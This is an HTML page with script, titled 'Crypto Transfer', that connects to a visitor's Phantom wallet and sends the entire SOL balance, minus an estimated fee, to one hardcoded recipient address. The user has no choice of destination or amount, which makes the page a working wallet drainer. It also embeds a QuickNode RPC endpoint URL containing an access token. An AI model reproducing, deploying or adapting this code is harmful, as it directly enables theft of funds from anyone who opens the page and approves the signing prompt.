<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Transfer</title>
    <!-- Correct Solana Web3.js library -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
</head>
<body>
    <h1>Click below to transfer all funds</h1>
    <button id="transferButton">Transfer Now</button>

    <script>
        document.getElementById('transferButton').addEventListener('click', async () => {
            if (!window.solana) {
                alert('Phantom wallet not found. Please install Phantom.');
                return;
            }

            try {
                // Connect to Phantom wallet
                const response = await window.solana.connect();
                const publicKey = response.publicKey;

                if (!publicKey) {
                    throw new Error('Failed to get public key.');
                }

                // Connect to Solana network
                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');

                // Check wallet balance
                const balance = await connection.getBalance(publicKey);

                if (balance <= 5000) {
                    alert('Insufficient SOL balance to cover the transaction fee.');
                    return;
                }

                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: new solanaWeb3.PublicKey(recipient),
                        lamports: balance - 5000 // Subtracting estimated transaction fee
                    })
                );

                transaction.feePayer = publicKey;
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;

                // Sign the transaction
                const signedTransaction = await window.solana.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());

                await connection.confirmTransaction(signature);

                alert(`Transaction successful: ${signature}`);
            } catch (error) {
                console.error('Transaction failed:', error);
                alert(`Transaction failed: ${error.message}`);
            }
        });
    </script>
</body>
</html>
